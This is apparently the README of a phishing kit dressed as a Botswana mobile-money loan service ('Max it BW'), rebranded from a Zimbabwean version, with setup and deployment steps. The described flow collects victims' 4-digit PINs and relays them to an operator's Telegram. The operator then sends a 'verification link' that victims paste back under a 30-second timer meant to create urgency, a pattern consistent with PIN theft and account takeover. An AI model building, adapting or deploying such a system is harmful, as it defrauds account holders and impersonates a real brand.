# Max it BW - Botswana Loan Application System 🇧🇼

This loan application system has been fully rebranded for **Max it BW** (Botswana).

## 🔄 Key Changes Made

### Branding Changes
- **Telecel Play** → **Max it BW**
- **Zimbabwe** → **Botswana**
- **Color Scheme**: Orange (#FF6B00) & Blue (#0066CC) theme

### Currency & Financial
- **Currency**: USD (US Dollars) → **P (Pula)** - Botswana's currency
- **Loan Range**: P 500 to P 50,000 (realistic for Botswana market)
- **Interest Rate**: 12% APR (unchanged)

### Contact & Location
- **Phone Code**: +263 (Zimbabwe) → **+267 (Botswana)**
- **Cities**: Gaborone, Francistown, Maun
- **Website**: maxitbw.co.bw
- **Email**: support@maxitbw.co.bw

### 🚨 CRITICAL Technical Changes

#### PIN System - 4 DIGITS ✅
- **Format**: 4-digit PIN (unchanged from original)
- **Reason**: Standard for mobile money

#### VERIFICATION SYSTEM - MAJOR CHANGE ⚠️
- **Previous**: 5-digit OTP code in separate boxes
- **Now**: **Single text box for pasting verification LINK**
- **Timer**: **30 seconds** (changed from 60 seconds)
- **Reason**: Max it BW uses link-based verification instead of numeric codes

#### Phone Number Format
- **Format**: +267 XX XXX XXX
- **Example**: +267 71 123 456

## 📁 Files Included

All files have been fully rebranded:

### HTML Files
- ✅ `index.html` - Landing page
- ✅ `application.html` - Loan application form
- ✅ `verification.html` - 4-digit PIN verification
- ✅ `otp.html` - **Link verification (30-second timer)** ⚠️ MAJOR CHANGE
- ✅ `approval.html` - Loan approval page
- ✅ `admin-select.html` - Admin selection

### JavaScript Files
- ✅ `landing-script.js` - Calculator & interactions (P currency)
- ✅ `application-script.js` - Form handling
- ✅ `verification-script.js` - PIN verification logic
- ✅ `otp-script.js` - **Link handling (30-second timer)** ⚠️ MAJOR CHANGE
- ✅ `approval-script.js` - Approval page logic (P currency)

### Backend Files
- ✅ `server.js` - Express backend
- ✅ `database.js` - MongoDB configuration
- ✅ `get-chat-id.js` - Telegram setup helper

### Configuration & Documentation
- ✅ `package.json` - Dependencies
- ✅ `style.css` - **Orange & Blue Max it BW theme**
- ✅ `README.md` - This documentation

## 🎨 Max it BW Theme

The orange and blue theme is visible throughout:
- **Primary Orange**: #FF6B00
- **Primary Blue**: #0066CC
- **Dark Orange**: #E55A00
- **Light Orange**: #FF8533
- **Buttons**: Orange-to-dark-orange gradient backgrounds
- **Hover Effects**: Orange/blue highlights
- **Accents**: Blue for secondary elements

## 🇧🇼 Botswana Market Adaptations

### Realistic Loan Amounts
- **Minimum**: P 500
- **Maximum**: P 50,000
- **Default**: P 5,000
- **Step**: P 500

### Interest Rate
- **APR**: 12% (competitive for Botswana market)
- **Monthly calculations**: Based on standard loan formula

### Example Calculations (in Pula)
| Loan Amount | Term | Monthly Payment | Total Repayment |
|-------------|------|-----------------|-----------------|
| P 5,000     | 12mo | ~P 460          | ~P 5,520        |
| P 10,000    | 12mo | ~P 920          | ~P 11,040       |
| P 25,000    | 12mo | ~P 2,300        | ~P 27,600       |
| P 50,000    | 12mo | ~P 4,600        | ~P 55,200       |

## 🚀 Quick Setup (5 Minutes)

### 1. Install Dependencies
```bash
npm install
```

### 2. Create .env File
```env
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/maxitbw
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
PORT=3000
```

### 3. Configure Admin (Edit database.js)
```javascript
const admins = [
    {
        id: 'admin_bw_001',
        name: 'Thabo Mokone',              // Your name
        email: 'thabo@maxitbw.co.bw',      // Your email
        telegramChatId: '123456789',       // Get from bot
        status: 'active'
    }
];
```

### 4. Get Telegram Chat ID
```bash
node get-chat-id.js
# Send message to your bot
# Copy the chat ID that appears
```

### 5. Start Application
```bash
npm start
# Visit http://localhost:3000
```

## 🧪 Testing Checklist

Test the complete flow with Botswana-specific data:

### Landing Page
- ✅ Calculator shows P currency
- ✅ Amounts range from P 500 to P 50,000
- ✅ Branding shows "Max it BW"
- ✅ Orange and blue color theme displays correctly

### Application Form
- ✅ Currency symbols show P
- ✅ Min/max loan amounts: P 500 - P 50,000
- ✅ Phone number format: +267 XX XXX XXX
- ✅ Cities: Gaborone, Francistown, Maun options

### PIN Verification
- ✅ 4-digit PIN input works
- ✅ Telegram notification sent to admin
- ✅ Admin can approve/reject PIN

### Link Verification (CRITICAL) ⚠️
- ✅ **Shows single text input box** (not 5 boxes!)
- ✅ **Accepts pasted verification link**
- ✅ **30-second countdown timer** (not 60!)
- ✅ Admin receives link request in Telegram
- ✅ Admin can send verification link to customer
- ✅ Link can be pasted in format: URL or just code

### Approval Page
- ✅ Shows loan amount in P (Pula)
- ✅ Monthly payment calculated correctly
- ✅ All amounts display with P symbol

## ⚠️ IMPORTANT: Link Verification System

### How It Works

1. **Customer applies** → Enters PIN
2. **Admin approves PIN** → Sends verification link to customer
3. **Customer receives link** via Telegram/SMS/WhatsApp
4. **Customer pastes link** in the single input box
5. **30-second timer** starts countdown
6. **Admin approves link** → Customer sees approval

### Link Format

The system accepts:
- Full URL: `https://maxitbw.co.bw/verify?code=ABC123`
- Path only: `/verify/ABC123`
- Code only: `ABC123`

The JavaScript will extract the code automatically.

### Why 30 Seconds?

- **Security**: Short expiry prevents unauthorized access
- **Urgency**: Encourages immediate action
- **Industry standard**: Many Botswana services use 30-second codes

## 🔒 Security Features

All security features maintained:
- ✅ 256-bit SSL encryption
- ✅ Two-factor authentication (PIN + Link)
- ✅ Telegram admin notifications
- ✅ Session management
- ✅ Input validation
- ✅ 30-second link expiry

## 📞 Support Information

Update these in production:
- **Website**: https://maxitbw.co.bw
- **Email**: support@maxitbw.co.bw
- **Phone**: +267 XXX XXXX

## 🌍 Deployment Options

### Option 1: Render.com (Recommended - Free)
```bash
# Connect GitHub repository
# Add environment variables
# Deploy!
```

### Option 2: Heroku
```bash
heroku create maxit-bw-loan
git push heroku main
heroku config:set MONGODB_URI=xxx
heroku config:set TELEGRAM_BOT_TOKEN=xxx
```

### Option 3: Own Server
```bash
# Install Node.js, MongoDB
# Clone repository
# Configure .env
# Run with PM2 or systemd
```

## 📊 Success Metrics to Track

- Application completion rate
- Average loan amount requested
- Approval rate
- Average approval time
- Customer satisfaction
- Mobile vs desktop usage
- Link verification success rate

## 🎯 Summary of Major Changes

1. **Branding**: Telecel Play → Max it BW
2. **Country**: Zimbabwe → Botswana
3. **Currency**: USD → P (Pula)
4. **Phone**: +267 (Botswana code)
5. **Colors**: Orange & Blue theme
6. **Cities**: Botswana cities
7. **Loan limits**: P 500 - P 50,000
8. **PIN**: 4 digits (unchanged)
9. **⚠️ VERIFICATION**: 5 OTP boxes → Single link input
10. **⚠️ TIMER**: 60 seconds → 30 seconds

---

**Made for Max it BW** 🇧🇼  
**Version**: 1.0.0  
**Last Updated**: February 2026  
**Market**: Botswana
